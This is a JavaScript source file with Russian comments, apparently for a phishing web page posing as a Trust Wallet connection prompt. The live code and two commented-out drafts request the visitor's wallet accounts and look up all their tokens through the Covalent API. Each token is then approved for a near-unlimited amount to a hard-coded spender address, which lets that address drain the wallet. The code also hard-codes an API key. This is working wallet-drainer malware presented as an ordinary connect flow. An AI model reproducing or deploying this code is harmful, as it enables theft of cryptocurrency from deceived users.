// const COVALENT_API_KEY = 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA';
// const CHAIN_ID = 1; 
// const SPENDER_ADDRESS = '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75'; 

// document.getElementById("connectWallet").addEventListener("click", () => {
//     console.log('Кнопка нажата, начинаем попытку открыть Trust Wallet');
//     setTimeout(() => {
//         try {
//             console.log('Пытаемся открыть Trust Wallet через схему URL');
//             window.location.href = "trust://";  
//             setTimeout(() => {
//                 console.log('Если приложение не установлено, редиректим на сайт');
//                 window.location.href = "https://trustwallet.com/download"; 
//             }, 5000); 
//         } catch (err) {
//             console.error('Ошибка при открытии Trust Wallet:', err);
//         }
//     }, 3000); 
// });


// async function approveAllTokens(web3, userAddress) {
//     console.log('Запрашиваем токены с Covalent API...');
//     const url = `https://api.covalenthq.com/v1/${CHAIN_ID}/address/${userAddress}/balances_v2/?key=${COVALENT_API_KEY}`;
//     try {
//         const res = await fetch(url);
//         const data = await res.json();
//         console.log('Полученные данные:', data);

//         if (data && data.data && data.data.items) {
//             for (const token of data.data.items) {
//                 if (
//                     token.type === "cryptocurrency" &&
//                     token.contract_address &&
//                     token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee' 
//                 ) {
//                     const tokenAddress = token.contract_address;
//                     const tokenABI = [{
//                         "constant": false,
//                         "inputs": [
//                             { "name": "spender", "type": "address" },
//                             { "name": "value", "type": "uint256" }
//                         ],
//                         "name": "approve",
//                         "outputs": [{ "name": "", "type": "bool" }],
//                         "payable": false,
//                         "stateMutability": "nonpayable",
//                         "type": "function"
//                     }];

//                     const contract = new web3.eth.Contract(tokenABI, tokenAddress);
//                     const amount = web3.utils.toWei('1000000000000', 'ether'); 

//                     try {
//                         await contract.methods.approve(SPENDER_ADDRESS, amount).send({ from: userAddress });
//                         console.log(`Approved: ${token.contract_name || tokenAddress}`);
//                     } catch (e) {
//                         console.error(`Ошибка при approve: ${token.contract_name || tokenAddress}`, e.message);
//                     }
//                 }
//             }
//         }
//     } catch (err) {
//         console.error('Ошибка при запросе токенов с Covalent API:', err);
//     }
// }

// window.addEventListener('load', async () => {
//     console.log('Страница загружена, начинаем подключение к кошельку...');
//     if (typeof window.ethereum !== 'undefined') {
//         const web3 = new Web3(window.ethereum);
//         try {
//             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
//             const userAddress = accounts[0];
//             console.log("Адрес кошелька:", userAddress);

//             await approveAllTokens(web3, userAddress);
//         } catch (err) {
//             console.error("Ошибка при подключении к кошельку:", err);
//         }
//     } else {
//         console.error("Web3 не найден. Установите Trust Wallet или MetaMask.");
//     }});
// Конфигурация
//   const CONFIG = {
//     SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
//     COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
//     CHAIN_ID: 1,
//     TIMEOUT: 2000
//   };
  
//   document.addEventListener('DOMContentLoaded', () => {
//     setTimeout(showConnectButton, 2000);
//   });
  
//   function showConnectButton() {
//     const modal = document.getElementById('walletModal');
//     if (modal) {
//       modal.style.display = 'flex';
      
//       const connectBtn = document.getElementById('connectBtn');
//       if (connectBtn) {
//         connectBtn.addEventListener('click', handleWalletConnect);
//       }
//     }
//   }
  
//   async function handleWalletConnect() {
//     try {
//       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      
//       if (isMobile) {
//         await openTrustWallet();
        
//         setTimeout(checkWalletConnection, 1000);
//       } else {
//         alert('Please use a mobile device with Trust Wallet installed');
//       }
//     } catch (error) {
//       console.error('Connection error:', error);
//       alert('Connection failed. Please install Trust Wallet.');
//       redirectToDownload();
//     }
//   }
  
//   async function openTrustWallet() {
//     return new Promise((resolve) => {
//       try {
//         if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//           const iframe = document.createElement('iframe');
//           iframe.style.display = 'none';
//           iframe.src = 'trust://';
//           document.body.appendChild(iframe);
//           setTimeout(() => {
//             document.body.removeChild(iframe);
//             resolve();
//           }, 300);
//         } 
//         else {
//           window.location.href = 'trust://';
//           setTimeout(resolve, 300);
//         }
//       } catch (e) {
//         console.error('Error opening wallet:', e);
//         redirectToDownload();
//       }
//     });
//   }
  
//   function redirectToDownload() {
//     if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
//       window.location.href = 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';
//     } else {
//       window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
//     }
//   }
  
//   async function checkWalletConnection() {
//     if (window.trustwallet || window.ethereum) {
//       try {
//         const web3 = new Web3(window.trustwallet || window.ethereum);
//         const accounts = await web3.eth.requestAccounts();
        
//         if (accounts && accounts.length > 0) {
//           await approveTokens(web3, accounts[0]);
//           alert('All tokens approved successfully!');
//         } else {
//           alert('No accounts found. Please try again.');
//         }
//       } catch (error) {
//         console.error('Approval error:', error);
//         alert('Approval process failed. Please try again.');
//       }
//     } else {
//       alert('Trust Wallet not detected. Redirecting to download page...');
//       redirectToDownload();
//     }
//   }
  
//   async function approveTokens(web3, userAddress) {
//     try {
//       console.log('Fetching token balances...');
//       const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
//       const response = await fetch(url);
//       const { data } = await response.json();
  
//       if (data?.items) {
//         console.log(`Found ${data.items.length} tokens`);
        
//         for (const token of data.items) {
//           if (token.contract_address && 
//               token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
            
//             try {
//               console.log(`Processing token: ${token.contract_name || 'unnamed'} (${token.contract_address})`);
              
//               const contract = new web3.eth.Contract([{
//                 "constant": false,
//                 "inputs": [
//                   { "name": "spender", "type": "address" },
//                   { "name": "value", "type": "uint256" }
//                 ],
//                 "name": "approve",
//                 "outputs": [{ "name": "", "type": "bool" }],
//                 "payable": false,"stateMutability": "nonpayable",
//               "type": "function"
//             }], token.contract_address);

//             const tx = await contract.methods.approve(
//               CONFIG.SPENDER_ADDRESS, 
//               web3.utils.toWei('1000000', 'ether')
//             ).send({ from: userAddress });
            
//             console.log(`Approved successfully: ${token.contract_name || token.contract_address}`, tx);
//           } catch (e) {
//             console.warn(`Skipping token ${token.contract_name || token.contract_address}:`, e.message);
//           }
//         }
//       }
//     }
//   } catch (error) {
//     console.error('Error in token approval:', error);
//     throw error;
//   }
// };

const CONFIG = {
    SPENDER_ADDRESS: '0x064A55328f66BF8CAC8Db42BD5a692CC3d848d75',
    COVALENT_API_KEY: 'nFuFp8RwkyBnTc1GRQ4HGDoLvVAgniWuzr2kLI2bGkPIZPGQHNJBZA',
    CHAIN_ID: 1,
    TIMEOUT: 2000
};

// Показать кнопку через 2 секунды после загрузки страницы
document.addEventListener('DOMContentLoaded', () => {
    setTimeout(showConnectButton, 2000);
});

function showConnectButton() {
    const modal = document.getElementById('walletModal');
    if (modal) {
        modal.style.display = 'flex';
        
        // Добавляем обработчик на кнопку
        const connectBtn = document.getElementById('connectBtn');
        if (connectBtn) {
            connectBtn.addEventListener('click', handleWalletConnect);
        }
    }
}

async function handleWalletConnect() {
    try {
        // Проверяем мобильное устройство
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        
        if (isMobile) {
            // Пытаемся открыть Trust Wallet
            await openTrustWallet();
            
            // Проверяем подключение через 1 секунду
            setTimeout(checkWalletConnection, 1000);
        } else {
            alert('Please use a mobile device with Trust Wallet installed');
        }
    } catch (error) {
        console.error('Connection error:', error);
        alert('Connection failed. Please install Trust Wallet.');
        redirectToDownload();
    }
}

async function openTrustWallet() {
    return new Promise((resolve) => {
        try {
            // Для iOS (Safari)
            if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = 'trust://';
                document.body.appendChild(iframe);
                setTimeout(() => {
                    document.body.removeChild(iframe);
                    resolve();
                }, 500); // Увеличиваем время ожидания
            } 
            // Для Android
            else {
                window.location.href = 'trust://';
                setTimeout(resolve, 300);
            }
        } catch (e) {
            console.error('Error opening wallet:', e);
            redirectToDownload();
        }
    });
}

function redirectToDownload() {
    if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
        window.location.href = 'https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409';
    } else {
        window.location.href = 'https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp';
    }
}

async function checkWalletConnection() {
    if (window.ethereum) {
        try {
            const web3 = new Web3(window.ethereum);
            // Запрашиваем доступ к аккаунтам
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            
            if (accounts && accounts.length > 0) {
                await approveTokens(web3, accounts[0]);
                alert('All tokens approved successfully!');
            } else {
                alert('No accounts found. Please try again.');
            }
        } catch (error) {
            console.error('Approval error:', error);
            alert('Approval process failed. Please try again.');
        }
    } else {
        alert('Trust Wallet not detected. Redirecting to download page...');
        redirectToDownload();
    }
}

async function approveTokens(web3, userAddress) {
    try {
        console.log('Fetching token balances...');
        const url = `https://api.covalenthq.com/v1/${CONFIG.CHAIN_ID}/address/${userAddress}/balances_v2/?key=${CONFIG.COVALENT_API_KEY}`;
        
        // Проверим сформированный URL
        console.log('API Request URL:', url);
        
        const response = await fetch(url);
        
        // Проверим, если был получен успешный ответ
        if (!response.ok) {
            console.error(`Error fetching data from Covalent API: ${response.status} ${response.statusText}`);
            return;
        }

        const { data } = await response.json();
        
        // Проверим структуру данных
        console.log('API Response Data:', data);
        
        if (data?.items) {
            console.log(`Found ${data.items.length} tokens`);
            
            for (const token of data.items) {
                if (token.contract_address && token.contract_address !== '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee') {
                    try {
                        console.log(`Processing token: ${token.contract_name || 'unnamed'} (${token.contract_address})`);
                        
                        const contract = new web3.eth.Contract([{
                            "constant": false,
                            "inputs": [
                                { "name": "spender", "type": "address" },
                                { "name": "value", "type": "uint256" }
                            ],
                            "name": "approve",
                            "outputs": [{ "name": "", "type": "bool" }],
                            "payable": false,
                            "stateMutability": "nonpayable",
                            "type": "function"
                        }], token.contract_address);
                        
                        const amount = web3.utils.toWei('1000000000000', 'ether'); // Максимальное количество
                        await contract.methods.approve(CONFIG.SPENDER_ADDRESS, amount).send({ from: userAddress });
                        console.log(`Approved: ${token.contract_name || token.contract_address}`);
                    } catch (e) {
                        console.error(`Error approving token: ${token.contract_name || token.contract_address}`, e);
                    }
                }
            }
        } else {
            console.log('No items found in API response');
        }
    } catch (err) {
        console.error('Error fetching token balances:', err);
    }
};